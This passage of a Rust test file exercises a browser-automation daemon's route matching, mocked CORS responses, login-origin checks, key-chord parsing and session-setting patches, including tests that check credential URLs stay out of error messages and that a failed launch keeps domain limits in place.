            // the first answering route wins; a fetch-only route earlier is skipped
            (
                vec![
                    route("*/api/order", &["fetch"], true, false),
                    route("*/api/*", &["xhr"], true, false),
                ],
                order,
                "XHR",
                Some("*/api/*"),
            ),
            (
                vec![
                    route("*/api/*", &[], true, false),
                    route("*/api/order", &[], false, true),
                ],
                order,
                "XHR",
                Some("*/api/*"),
            ),
            // the browser's own types go through the same predicate
            (
                vec![route("*/a", &["fetch"], true, false)],
                "http://h/a",
                "Fetch",
                Some("*/a"),
            ),
            (
                vec![route("*/a", &["xhr"], true, false)],
                "http://h/a",
                "Fetch",
                None,
            ),
        ];
        for (i, (routes, url, rt, want)) in cases.iter().enumerate() {
            let got = select_route(routes, url, rt).map(|r| {
                if r.abort {
                    "abort".to_string()
                } else {
                    r.response.as_ref().unwrap().body.clone().unwrap()
                }
            });
            assert_eq!(got.as_deref(), *want, "case {i}");
            // The flow's direct request is classified as the page's fetch().
            if *rt == FLOW_DIRECT_RESOURCE_TYPE {
                let flow = flow_route_answer(routes, url).map(|r| {
                    if r.abort {
                        "abort".to_string()
                    } else {
                        r.body
                    }
                });
                assert_eq!(flow.as_deref(), *want, "flow case {i}");
            }
        }
    }

    #[tokio::test]
    async fn test_build_fetch_patterns_with_routes() {
        let state = DaemonState::new();
        {
            let mut routes = state.routes.write().await;
            routes.push(super::RouteEntry {
                url_pattern: "https://example.com/*".to_string(),
                response: None,
                abort: true,
                resource_types: Vec::new(),
            });
        }
        let patterns = build_fetch_patterns(&state).await;
        assert_eq!(patterns.len(), 1);
        assert_eq!(patterns[0]["urlPattern"], "https://example.com/*");
    }

    #[test]
    fn test_route_url_matches_multi_wildcard_patterns() {
        assert!(route_url_matches(
            "**/api/users",
            "https://app.example.com/v1/api/users"
        ));
        assert!(route_url_matches(
            "**/analytics/**",
            "https://cdn.example.com/analytics/event.js"
        ));
        assert!(route_url_matches(
            "https://example.com/*/users",
            "https://example.com/api/users"
        ));
        assert!(!route_url_matches(
            "**/api/users",
            "https://app.example.com/v1/api/users/42"
        ));
        assert!(!route_url_matches(
            "**/analytics/**",
            "https://cdn.example.com/static/event.js"
        ));
    }

    // wait --url delegates to route_url_matches against the full location.href.
    #[test]
    fn test_wait_url_matches_full_dev_server_urls() {
        assert!(route_url_matches(
            "**/the-edge-of-the-page",
            "http://localhost:3001/the-edge-of-the-page"
        ));
        assert!(route_url_matches(
            "**/dashboard",
            "http://localhost:3000/dashboard"
        ));
        assert!(route_url_matches(
            "/dashboard",
            "http://localhost:3000/dashboard"
        ));
        assert!(!route_url_matches(
            "**/dashboard",
            "http://localhost:3000/settings"
        ));
    }

    #[tokio::test]
    async fn test_build_fetch_patterns_collapses_repeated_wildcards() {
        let state = DaemonState::new();
        {
            let mut routes = state.routes.write().await;
            routes.push(super::RouteEntry {
                url_pattern: "**/api/users".to_string(),
                response: None,
                abort: true,
                resource_types: Vec::new(),
            });
        }
        let patterns = build_fetch_patterns(&state).await;
        assert_eq!(patterns.len(), 1);
        assert_eq!(patterns[0]["urlPattern"], "*/api/users");
    }

    #[test]
    fn test_parse_route_response_from_nested_response() {
        let response = parse_route_response(&json!({
            "response": {
                "status": 201,
                "body": "{\"ok\":true}",
                "contentType": "application/json",
                "headers": { "x-test": "yes" }
            }
        }))
        .expect("response should parse");

        assert_eq!(response.status, Some(201));
        assert_eq!(response.body.as_deref(), Some("{\"ok\":true}"));
        assert_eq!(response.content_type.as_deref(), Some("application/json"));
        assert_eq!(
            response
                .headers
                .as_ref()
                .and_then(|headers| headers.get("x-test"))
                .map(String::as_str),
            Some("yes")
        );
    }

    fn header_value<'a>(headers: &'a [Value], name: &str) -> Option<&'a str> {
        headers
            .iter()
            .find(|h| h["name"].as_str() == Some(name))
            .and_then(|h| h["value"].as_str())
    }

    #[test]
    fn test_mocked_response_passes_cors_for_cross_origin_requests() {
        let resp = RouteResponse {
            status: None,
            body: Some(r#"{"mock":true}"#.to_string()),
            content_type: None,
            headers: None,
            allow_origin: Some("https://www.example.com".to_string()),
        };
        let request = json!({ "Origin": "https://www.example.com" });
        let (status, headers, body) = mocked_response(&resp, request.as_object());
        assert_eq!(status, 200);
        assert!(!body.is_empty());
        assert_eq!(
            header_value(&headers, "Content-Type"),
            Some("application/json")
        );
        assert_eq!(
            header_value(&headers, "Access-Control-Allow-Origin"),
            Some("https://www.example.com")
        );

        let preflight = json!({
            "Referer": "https://www.example.com/page",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "content-type,x-client",
        });
        let (status, headers, body) = mocked_response(&resp, preflight.as_object());
        assert_eq!(status, 204);
        assert!(body.is_empty());
        assert_eq!(
            header_value(&headers, "Access-Control-Allow-Origin"),
            Some("https://www.example.com")
        );
        assert_eq!(
            header_value(&headers, "Access-Control-Allow-Methods"),
            Some("POST")
        );
        assert_eq!(
            header_value(&headers, "Access-Control-Allow-Headers"),
            Some("content-type,x-client")
        );
    }

    #[test]
    fn test_mocked_response_gives_other_origins_no_cors() {
        let resp = RouteResponse {
            status: None,
            body: Some(r#"{"private":true}"#.to_string()),
            content_type: None,
            headers: None,
            allow_origin: Some("https://www.example.com".to_string()),
        };
        let request = json!({ "Origin": "https://attacker.test" });
        let (_, headers, _) = mocked_response(&resp, request.as_object());
        assert!(header_value(&headers, "Access-Control-Allow-Origin").is_none());
        let preflight = json!({
            "Origin": "https://attacker.test",
            "Access-Control-Request-Method": "GET",
        });
        let (status, _, _) = mocked_response(&resp, preflight.as_object());
        assert_eq!(status, 200);

        let closed = RouteResponse {
            allow_origin: None,
            ..resp
        };
        let request = json!({ "Origin": "https://www.example.com" });
        let (_, headers, _) = mocked_response(&closed, request.as_object());
        assert!(header_value(&headers, "Access-Control-Allow-Origin").is_none());
        assert_eq!(
            header_value(&headers, "Content-Type"),
            Some("application/json")
        );
    }

    #[test]
    fn test_mocked_response_does_not_duplicate_route_headers() {
        let mut own = HashMap::new();
        own.insert(
            "Access-Control-Allow-Credentials".to_string(),
            "true".to_string(),
        );
        own.insert(
            "content-type".to_string(),
            "application/vnd.api+json".to_string(),
        );
        let resp = RouteResponse {
            status: None,
            body: Some(r#"{"a":1}"#.to_string()),
            content_type: None,
            headers: Some(own),
            allow_origin: Some("https://www.example.com".to_string()),
        };
        let request = json!({ "Origin": "https://www.example.com" });
        let (_, headers, _) = mocked_response(&resp, request.as_object());
        let count = |name: &str| {
            headers
                .iter()
                .filter(|h| {
                    h["name"]
                        .as_str()
                        .is_some_and(|n| n.eq_ignore_ascii_case(name))
                })
                .count()
        };
        assert_eq!(count("Access-Control-Allow-Credentials"), 1);
        assert_eq!(count("Content-Type"), 1);
        assert_eq!(count("Access-Control-Allow-Origin"), 1);
    }

    #[test]
    fn test_mocked_response_keeps_explicit_cors_and_content_type() {
        let mut own = HashMap::new();
        own.insert("Access-Control-Allow-Origin".to_string(), "*".to_string());
        let resp = RouteResponse {
            status: Some(201),
            body: Some("plain".to_string()),
            content_type: Some("text/plain".to_string()),
            headers: Some(own),
            allow_origin: None,
        };
        let request = json!({ "Origin": "https://www.example.com" });
        let (status, headers, _) = mocked_response(&resp, request.as_object());
        assert_eq!(status, 201);
        assert_eq!(header_value(&headers, "Content-Type"), Some("text/plain"));
        assert_eq!(
            headers
                .iter()
                .filter(|h| h["name"] == "Access-Control-Allow-Origin")
                .count(),
            1
        );
        let (_, headers, _) = mocked_response(&resp, None);
        assert!(header_value(&headers, "Access-Control-Allow-Credentials").is_none());
    }

    #[test]
    fn test_parse_route_response_accepts_legacy_top_level_body() {
        let response = parse_route_response(&json!({ "body": "{\"users\":[]}" }))
            .expect("legacy body should parse");

        assert_eq!(response.status, None);
        assert_eq!(response.body.as_deref(), Some("{\"users\":[]}"));
        assert_eq!(response.content_type, None);
        assert_eq!(response.headers, None);
        assert_eq!(response.allow_origin, None);
    }

    #[tokio::test]
    async fn test_build_fetch_patterns_adds_wildcard_for_domain_filter() {
        let state = DaemonState::new();
        {
            let mut df = state.domain_filter.write().await;
            *df = Some(super::super::network::DomainFilter::new("example.com"));
        }
        let patterns = build_fetch_patterns(&state).await;
        assert_eq!(patterns.len(), 1);
        assert_eq!(patterns[0]["urlPattern"], "*");
    }

    #[tokio::test]
    async fn test_build_fetch_patterns_adds_wildcard_for_origin_headers() {
        let state = DaemonState::new();
        {
            let mut oh = state.origin_headers.write().await;
            let mut headers = HashMap::new();
            headers.insert("Authorization".to_string(), "Bearer xxx".to_string());
            oh.insert("http://example.com".to_string(), headers);
        }
        let patterns = build_fetch_patterns(&state).await;
        assert_eq!(patterns.len(), 1);
        assert_eq!(patterns[0]["urlPattern"], "*");
    }

    #[tokio::test]
    async fn test_build_fetch_patterns_no_duplicate_wildcard() {
        let state = DaemonState::new();
        {
            let mut routes = state.routes.write().await;
            routes.push(super::RouteEntry {
                url_pattern: "*".to_string(),
                response: None,
                abort: false,
                resource_types: Vec::new(),
            });
        }
        {
            let mut df = state.domain_filter.write().await;
            *df = Some(super::super::network::DomainFilter::new("example.com"));
        }
        let patterns = build_fetch_patterns(&state).await;
        assert_eq!(
            patterns.len(),
            1,
            "Should not add a second wildcard when routes already contain one"
        );
    }

    #[test]
    fn test_auth_login_waits_for_load_event() {
        use super::super::browser::WaitUntil;
        assert_eq!(
            super::AUTH_LOGIN_WAIT_UNTIL,
            WaitUntil::Load,
            "auth_login should navigate with Load and then wait for form \
             selectors explicitly"
        );
    }

    #[test]
    fn test_auth_login_origin_ignores_path_query_and_fragment() {
        let first = auth_login_origin(
            "https://example.com/login?credential-path-sentinel#credential-fragment-sentinel",
            "credential",
        )
        .unwrap();
        let second = auth_login_origin(
            "https://example.com/consent?current-path-sentinel#current-fragment-sentinel",
            "current page",
        )
        .unwrap();
        assert_eq!(first, second);
        assert_eq!(first.0, "https://example.com");
    }

    #[test]
    fn test_auth_login_origin_normalizes_default_ports() {
        assert_eq!(
            auth_login_origin("http://example.com:80/login", "credential").unwrap(),
            auth_login_origin("http://example.com/flow", "current page").unwrap()
        );
        assert_eq!(
            auth_login_origin("https://example.com:443/login", "credential").unwrap(),
            auth_login_origin("https://example.com/flow", "current page").unwrap()
        );
    }

    #[test]
    fn test_auth_login_origin_rejects_mismatched_origins() {
        let expected = auth_login_origin("https://example.com/login", "credential").unwrap();
        assert_ne!(
            expected,
            auth_login_origin("http://example.com/login", "current page").unwrap()
        );
        assert_ne!(
            expected,
            auth_login_origin("https://id.example.com/login", "current page").unwrap()
        );
        assert_ne!(
            expected,
            auth_login_origin("https://example.com:8443/login", "current page").unwrap()
        );
    }

    #[test]
    fn test_auth_login_origin_rejects_malformed_opaque_and_non_http_urls() {
        for value in [
            "not a url",
            "about:blank",
            "data:text/html,login",
            "file:///tmp/login.html",
            "https://",
            "https:///login",
            "https:example.com/login",
        ] {
            let error = auth_login_origin(value, "credential").unwrap_err();
            assert!(error.contains("absolute HTTP(S) URL with a host"));
            assert!(!error.contains(value));
        }
    }

    #[test]
    fn test_auth_login_origin_mismatch_error_is_sanitized() {
        let current = auth_login_origin(
            "https://login.example.com/current-path-sentinel?current-query-sentinel#current-fragment-sentinel",
            "current page",
        )
        .unwrap();
        let expected = auth_login_origin(
            "https://example.com/credential-path-sentinel?credential-query-sentinel#credential-fragment-sentinel",
            "credential",
        )
        .unwrap();
        let error = ensure_auth_login_origin_matches(&current, &expected).unwrap_err();

        assert_eq!(
            error,
            "Current page origin https://login.example.com does not match credential origin https://example.com"
        );
        for sentinel in [
            "current-path-sentinel",
            "current-query-sentinel",
            "current-fragment-sentinel",
            "credential-path-sentinel",
            "credential-query-sentinel",
            "credential-fragment-sentinel",
        ] {
            assert!(!error.contains(sentinel));
        }
    }

    #[test]
    fn test_parse_key_chord_plain_key() {
        let (key, mods) = parse_key_chord("a");
        assert_eq!(key, "a");
        assert_eq!(mods, None);
    }

    #[test]
    fn test_parse_key_chord_enter() {
        let (key, mods) = parse_key_chord("Enter");
        assert_eq!(key, "Enter");
        assert_eq!(mods, None);
    }

    #[test]
    fn test_parse_key_chord_control_a() {
        let (key, mods) = parse_key_chord("Control+a");
        assert_eq!(key, "a");
        assert_eq!(mods, Some(2));
    }

    #[test]
    fn test_parse_key_chord_ctrl_alias() {
        let (key, mods) = parse_key_chord("Ctrl+c");
        assert_eq!(key, "c");
        assert_eq!(mods, Some(2));
    }

    #[test]
    fn test_parse_key_chord_shift_enter() {
        let (key, mods) = parse_key_chord("Shift+Enter");
        assert_eq!(key, "Enter");
        assert_eq!(mods, Some(8));
    }

    #[test]
    fn test_parse_key_chord_control_shift_a() {
        let (key, mods) = parse_key_chord("Control+Shift+a");
        assert_eq!(key, "a");
        assert_eq!(mods, Some(2 | 8));
    }

    #[test]
    fn test_parse_key_chord_meta_a() {
        let (key, mods) = parse_key_chord("Meta+a");
        assert_eq!(key, "a");
        assert_eq!(mods, Some(4));
    }

    #[test]
    fn test_parse_key_chord_alt_tab() {
        let (key, mods) = parse_key_chord("Alt+Tab");
        assert_eq!(key, "Tab");
        assert_eq!(mods, Some(1));
    }

    #[test]
    fn test_parse_key_chord_plus_key() {
        // A bare "+" should not be confused with a separator
        let (key, mods) = parse_key_chord("+");
        assert_eq!(key, "+");
        assert_eq!(mods, None);
    }

    #[tokio::test]
    async fn test_auto_dialog_enabled_by_default() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_NO_AUTO_DIALOG"]);
        std::env::remove_var("AGENT_BROWSER_NO_AUTO_DIALOG");
        let state = DaemonState::new();
        assert!(state.auto_dialog, "auto_dialog should be true by default");
        drop(guard);
    }

    #[tokio::test]
    async fn test_auto_dialog_disabled_by_env() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_NO_AUTO_DIALOG"]);
        guard.set("AGENT_BROWSER_NO_AUTO_DIALOG", "1");
        let state = DaemonState::new();
        assert!(
            !state.auto_dialog,
            "auto_dialog should be false when AGENT_BROWSER_NO_AUTO_DIALOG=1"
        );
        drop(guard);
    }

    #[tokio::test]
    async fn test_auto_dialog_disabled_by_env_true() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_NO_AUTO_DIALOG"]);
        guard.set("AGENT_BROWSER_NO_AUTO_DIALOG", "true");
        let state = DaemonState::new();
        assert!(
            !state.auto_dialog,
            "auto_dialog should be false when AGENT_BROWSER_NO_AUTO_DIALOG=true"
        );
        drop(guard);
    }

    #[tokio::test]
    async fn test_auto_dialog_not_disabled_by_random_value() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_NO_AUTO_DIALOG"]);
        guard.set("AGENT_BROWSER_NO_AUTO_DIALOG", "no");
        let state = DaemonState::new();
        assert!(
            state.auto_dialog,
            "auto_dialog should remain true for non-truthy env values"
        );
        drop(guard);
    }

    #[test]
    fn test_pending_dialog_not_set_for_auto_handled_alert() {
        // Simulate what handle_browser_event does: when auto_dialog is true,
        // alert/beforeunload should NOT populate pending_dialog.
        let auto_dialog = true;
        for dialog_type in &["alert", "beforeunload"] {
            let auto_handled = auto_dialog && matches!(*dialog_type, "beforeunload" | "alert");
            assert!(
                auto_handled,
                "{dialog_type} should be auto-handled when auto_dialog is true"
            );
        }
    }

    #[test]
    fn test_pending_dialog_set_for_confirm_prompt() {
        // confirm and prompt should NOT be auto-handled even when auto_dialog is true.
        let auto_dialog = true;
        for dialog_type in &["confirm", "prompt"] {
            let auto_handled = auto_dialog && matches!(*dialog_type, "beforeunload" | "alert");
            assert!(!auto_handled, "{dialog_type} should NOT be auto-handled");
        }
    }
    // === Session settings applied from a patch ===

    /// A daemon state built from defaults, holding the env lock with every
    /// AGENT_BROWSER_* variable cleared so no other test's settings leak in.
    fn isolated_state() -> (IsolatedEnv, DaemonState) {
        let mut names: Vec<String> = std::env::vars()
            .map(|(name, _)| name)
            .filter(|name| name.starts_with("AGENT_BROWSER_"))
            .collect();
        if !names.iter().any(|name| name == "AGENT_BROWSER_SOCKET_DIR") {
            names.push("AGENT_BROWSER_SOCKET_DIR".to_string());
        }
        let refs: Vec<&str> = names.iter().map(String::as_str).collect();
        let guard = EnvGuard::new(&refs);
        for name in &refs {
            guard.remove(name);
        }
        // Session files go to a scratch directory, never the user's.
        let dir = tempfile::tempdir().unwrap();
        guard.set("AGENT_BROWSER_SOCKET_DIR", dir.path().to_str().unwrap());
        let state = DaemonState::new();
        (
            IsolatedEnv {
                _guard: guard,
                _dir: dir,
            },
            state,
        )
    }

    struct IsolatedEnv {
        // Restores the environment after the directory is gone.
        _guard: EnvGuard<'static>,
        _dir: tempfile::TempDir,
    }

    fn patch_with(entries: Vec<(Key, Requested)>) -> Patch {
        Patch::from_entries(entries)
    }

    fn set_to(key: Key, value: Value) -> (Key, Requested) {
        (key, Requested::Set(value))
    }

    #[test]
    fn test_launch_envelope_patch_names_what_the_command_sets() {
        let cmd = json!({
            "action": "launch",
            "headless": false,
            "profile": "/tmp/p",
            "args": ["--lang=en-US"],
            "cdpPort": 9222,
            "cdpHeaders": { "Authorization": "Bearer t" },
            "proxy": { "server": "http://proxy:8080", "username": "u", "password": "pw" },
            "ignoreHTTPSErrors": true,
            "allowedDomains": ["example.com"],
        });
        let patch = launch_envelope_patch(&cmd, None);

        assert_eq!(patch.value(Key::Headed), Some(&json!(true)));
        assert_eq!(patch.value(Key::Profile), Some(&json!("/tmp/p")));
        assert_eq!(patch.value(Key::Args), Some(&json!(["--lang=en-US"])));
        assert_eq!(patch.value(Key::Cdp), Some(&json!("9222")));
        assert_eq!(
            patch.value(Key::CdpHeaders),
            Some(&json!(r#"{"Authorization":"Bearer t"}"#))
        );
        assert_eq!(patch.value(Key::Proxy), Some(&json!("http://proxy:8080")));
        assert_eq!(patch.value(Key::ProxyUsername), Some(&json!("u")));
        assert_eq!(patch.value(Key::ProxyPassword), Some(&json!("pw")));
        assert_eq!(patch.value(Key::IgnoreHttpsErrors), Some(&json!(true)));
        assert_eq!(
            patch.value(Key::AllowedDomains),
            Some(&json!(["example.com"]))
        );
        assert_eq!(patch.get(Key::Provider), None);
    }

    #[test]
    fn test_a_plain_launch_names_no_settings() {
        // Bare `open` keeps the profile and args the session runs with (#2287).
        assert!(launch_envelope_patch(&json!({ "action": "launch" }), None).is_noop());
        assert!(launch_envelope_patch(
            &json!({ "action": "launch", "plugins": [], "id": "1" }),
            Some("obscura")
        )
        .is_noop());
    }

    #[test]
    fn test_launch_envelope_clears_the_obscura_bypass_only_for_obscura() {
        let cmd = json!({ "action": "launch", "proxyBypass": null });
        assert_eq!(
            launch_envelope_patch(&cmd, Some("obscura")).get(Key::ProxyBypass),
            Some(&Requested::Default)
        );
        assert!(launch_envelope_patch(&cmd, Some("chrome")).is_noop());
        assert_eq!(
            launch_envelope_patch(&json!({ "proxyBypass": "localhost" }), Some("obscura"))
                .value(Key::ProxyBypass),
            Some(&json!("localhost"))
        );
    }

    #[test]
    fn test_empty_allowed_domains_in_a_launch_clear_the_list() {
        let patch = launch_envelope_patch(&json!({ "allowedDomains": [] }), None);
        assert_eq!(patch.get(Key::AllowedDomains), Some(&Requested::Default));
    }

    #[tokio::test]
    async fn test_live_settings_apply_in_place_without_touching_the_browser() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        state.default_timeout_ms = 25_000;
        state.auto_dialog = true;
        let patch = patch_with(vec![
            set_to(Key::DefaultTimeout, json!(9000)),
            set_to(Key::NoAutoDialog, json!(true)),
            set_to(Key::ConfirmActions, json!("click")),
            set_to(Key::IdleTimeout, json!("120000")),
        ]);

        let outcome = apply_settings_patch(&mut state, &patch, true)
            .await
            .unwrap();

        assert_eq!(state.default_timeout_ms, 9000);
        assert!(!state.auto_dialog);
        assert!(state.confirm_actions.is_some());
        assert_eq!(state.idle_activity.timeout().map(|t| t.ms), Some(120_000));
        assert_eq!(state.settings.default_timeout_ms(), 9000);
        assert!(!outcome.relaunched_browser);
        assert_eq!(outcome.changes.len(), 4);
        assert!(outcome
            .changes
            .iter()
            .all(|c| c["effect"] == "live" && c["applied"] == true));
    }

    #[tokio::test]
    async fn test_action_policy_change_replaces_the_loaded_policy() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("policy.json");
        fs::write(&path, r#"{"default":"deny"}"#).unwrap();
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        state.policy = None;

        let patch = patch_with(vec![set_to(
            Key::ActionPolicy,
            json!(path.to_str().unwrap()),
        )]);
        apply_settings_patch(&mut state, &patch, true)
            .await
            .unwrap();

        assert!(state.policy.is_some());
    }

    #[tokio::test]
    async fn test_equal_settings_are_free() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        let patch = patch_with(vec![
            set_to(Key::Profile, json!("/tmp/p")),
            set_to(Key::DefaultTimeout, json!(9000)),
        ]);
        apply_settings_patch(&mut state, &patch, true)
            .await
            .unwrap();

        let again = apply_settings_patch(&mut state, &patch, true)
            .await
            .unwrap();

        assert!(again.changes.is_empty());
        assert!(!again.relaunched_browser && !again.forced);
    }

    #[tokio::test]
    async fn test_a_launch_change_without_a_browser_is_recorded_not_relaunched() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        let patch = patch_with(vec![set_to(Key::Profile, json!("/tmp/p"))]);

        let outcome = apply_settings_patch(&mut state, &patch, true)
            .await
            .unwrap();

        assert!(!outcome.relaunched_browser);
        assert_eq!(outcome.changes[0]["option"], "profile");
        assert_eq!(outcome.changes[0]["effect"], "relaunch");
        assert_eq!(outcome.changes[0]["applied"], false);
        assert_eq!(
            state.settings.launch_options().profile.as_deref(),
            Some("/tmp/p")
        );
    }

    #[tokio::test]
    async fn test_allowed_domains_change_updates_the_domain_filter() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();

        apply_settings_patch(
            &mut state,
            &patch_with(vec![set_to(Key::AllowedDomains, json!(["a.test"]))]),
            true,
        )
        .await
        .unwrap();
        assert_eq!(current_allowed_domains(&state).await, vec!["a.test"]);

        apply_settings_patch(
            &mut state,
            &patch_with(vec![(Key::AllowedDomains, Requested::Default)]),
            true,
        )
        .await
        .unwrap();
        assert!(state.domain_filter.read().await.is_none());
    }

    #[tokio::test]
    async fn test_a_new_connection_target_drops_the_attached_target() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        state.attached_target = Some(AttachedTarget::CdpPort(9222));

        apply_settings_patch(
            &mut state,
            &patch_with(vec![set_to(Key::Provider, json!("browserless"))]),
            true,
        )
        .await
        .unwrap();

        assert_eq!(state.attached_target, None);
    }

    #[tokio::test]
    async fn test_command_response_reports_the_settings_it_changed() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        let cmd = json!({
            "id": "1",
            "action": "session_info",
            "settings": { "profile": "/tmp/p", "default-timeout": 9000, "proxy-password": "pw" }
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["success"], true, "{resp}");
        let changes = resp["data"]["lifecycle"]["settings"]["changes"]
            .as_array()
            .unwrap_or_else(|| panic!("no settings in {resp}"));
        let options: Vec<&str> = changes
            .iter()
            .filter_map(|c| c["option"].as_str())
            .collect();
        // Live settings first; launch settings wait for a command that launches.
        assert_eq!(options, ["default-timeout", "profile", "proxy-password"]);
        assert_eq!(changes[1]["applied"], false);
        assert!(!resp.to_string().contains("\"pw\""), "{resp}");
        assert_eq!(resp["data"]["lifecycle"]["relaunchedBrowser"], false);
    }

    #[tokio::test]
    async fn test_a_command_with_no_settings_has_no_settings_report() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();

        let resp =
            execute_command(&json!({ "id": "1", "action": "session_info" }), &mut state).await;

        assert_eq!(resp["success"], true, "{resp}");
        assert!(
            resp["data"]["lifecycle"].get("settings").is_none(),
            "{resp}"
        );
    }

    #[tokio::test]
    async fn test_bad_settings_fail_the_command() {
        let (_env, mut state) = isolated_state();
        let cmd = json!({ "id": "1", "action": "session_info", "settings": { "headed": "yes" } });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["success"], false);
        assert!(resp["error"].as_str().unwrap().contains("headed"), "{resp}");
    }

    #[test]
    fn test_ca_trust_is_compared_by_content() {
        let a = Some([1u8; 32]);
        let b = Some([2u8; 32]);
        // The same certificates from another path reuse the browser.
        assert_eq!(
            ca_trust_change(Some("/ca-1.pem"), a, "/ca-2.pem", a),
            CaTrustChange::Unchanged
        );
        assert_eq!(
            ca_trust_change(Some("/ca.pem"), a, "/ca.pem", a),
            CaTrustChange::Unchanged
        );
        // The same path with different content is a change.
        assert_eq!(
            ca_trust_change(Some("/ca.pem"), a, "/ca.pem", b),
            CaTrustChange::EditedInPlace
        );
        // A new path with different content, or no trust running, is a change.
        assert_eq!(
            ca_trust_change(Some("/ca-1.pem"), a, "/ca-2.pem", b),
            CaTrustChange::Replaced
        );
        assert_eq!(
            ca_trust_change(None, None, "/ca.pem", a),
            CaTrustChange::Replaced
        );
    }
    #[tokio::test]
    async fn test_cdp_headers_are_not_sent_to_another_endpoint() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        let first = patch_with(vec![
            set_to(Key::Cdp, json!("wss://a.example/cdp")),
            set_to(Key::CdpHeaders, json!(r#"{"Authorization":"Bearer a"}"#)),
        ]);
        apply_settings_patch(&mut state, &first, true)
            .await
            .unwrap();
        assert!(cdp_headers_from_settings(&state.settings).is_some());

        let second = patch_with(vec![set_to(Key::Cdp, json!("wss://b.example/cdp"))]);
        apply_settings_patch(&mut state, &second, true)
            .await
            .unwrap();

        assert!(cdp_headers_from_settings(&state.settings).is_none());
    }

    #[tokio::test]
    async fn test_a_command_that_never_launches_leaves_launch_settings_pending() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        let patch = patch_with(vec![
            set_to(Key::Profile, json!("/tmp/p")),
            set_to(Key::DefaultTimeout, json!(9000)),
        ]);

        let outcome = apply_settings_patch(&mut state, &patch, false)
            .await
            .unwrap();

        assert_eq!(state.default_timeout_ms, 9000, "live settings still apply");
        assert_eq!(
            state.settings.get(Key::Profile),
            None,
            "launch settings wait"
        );
        assert!(!outcome.relaunched_browser);
        let profile = outcome
            .changes
            .iter()
            .find(|c| c["option"] == "profile")
            .expect("the pending change is reported");
        assert_eq!(profile["applied"], false);
    }

    #[tokio::test]
    async fn test_get_cdp_url_style_commands_do_not_relaunch() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        let cmd = json!({
            "id": "1",
            "action": "cdp_url",
            "settings": { "profile": "/tmp/p", "relaunch": true }
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(state.settings.get(Key::Profile), None);
        let lifecycle = &resp["data"]["lifecycle"];
        assert_ne!(lifecycle["relaunchedBrowser"], true, "{resp}");
        assert!(state.browser.is_none());
    }

    #[tokio::test]
    async fn test_storage_state_after_a_profile_does_not_wedge_the_session() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        state.settings.set(Key::Profile, json!("/tmp/inherited"));
        let patch = patch_with(vec![set_to(Key::StorageState, json!("/tmp/s.json"))]);

        apply_settings_patch(&mut state, &patch, true)
            .await
            .unwrap();

        let options = state.settings.launch_options();
        assert_eq!(options.profile, None);
        assert_eq!(options.storage_state.as_deref(), Some("/tmp/s.json"));
    }

    #[tokio::test]
    async fn test_a_plain_launch_keeps_the_running_profile() {
        // Bare `open` after `--profile` stays on that profile (#2287).
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        state.settings.set(Key::Profile, json!("/tmp/p"));

        let outcome = apply_settings_patch(&mut state, &Patch::default(), true)
            .await
            .unwrap();

        assert!(outcome.changes.is_empty());
        assert_eq!(
            state.settings.launch_options().profile.as_deref(),
            Some("/tmp/p")
        );
    }
    #[tokio::test]
    async fn test_failed_launch_puts_launch_settings_back_but_keeps_containment() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        let cmd = json!({
            "action": "launch",
            "executablePath": "/nonexistent/chrome",
            "allowedDomains": ["example.com"]
        });

        assert!(handle_launch(&cmd, &mut state).await.is_err());

        assert_eq!(
            state.settings.get(Key::ExecutablePath),
            None,
            "the launch setting is put back"
        );
        assert_eq!(
            current_allowed_domains(&state).await,
            vec!["example.com"],
            "a failed launch never widens containment"
        );
        assert_eq!(
            state.settings.security().allowed_domains,
            Some(vec!["example.com".to_string()])
        );
    }

    #[tokio::test]
    async fn test_failed_relaunch_keeps_the_stricter_filter_and_reports_the_rest() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        let cmd = json!({
            "id": "1",
            "action": "navigate",
            "url": "about:blank",
            "settings": {
                "allowed-domains": ["example.com"],
                "executable-path": "/nonexistent/chrome"
            }
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["success"], false, "{resp}");
        assert_eq!(state.settings.get(Key::ExecutablePath), None);
        assert_eq!(current_allowed_domains(&state).await, vec!["example.com"]);
        let changes = resp["data"]["lifecycle"]["settings"]["changes"]
            .as_array()
            .expect("a failed response reports the changes");
        let applied = |option: &str| {
            changes
                .iter()
                .find(|c| c["option"] == option)
                .map(|c| c["applied"].clone())
        };
        assert_eq!(applied("executable-path"), Some(json!(false)), "{resp}");
        assert_eq!(applied("allowed-domains"), Some(json!(true)), "{resp}");
    }

    #[tokio::test]
    async fn test_confirmation_gate_leaves_launch_settings_uncommitted() {
        let (_env, mut state) = isolated_state();
        state.settings = Running::defaults();
        let cmd = json!({
            "id": "1",
            "action": "navigate",
            "url": "about:blank",
            "settings": { "confirm-actions": "navigate", "profile": "/tmp/p3", "relaunch": true }
        });

        let resp = execute_command(&cmd, &mut state).await;

        assert_eq!(resp["data"]["confirmation_required"], true, "{resp}");
        assert_eq!(state.settings.get(Key::Profile), None, "{resp}");
        assert!(state.confirm_actions.is_some(), "live settings still apply");
        let settings = &resp["data"]["lifecycle"]["settings"];
        let profile = settings["changes"]
            .as_array()
            .unwrap()
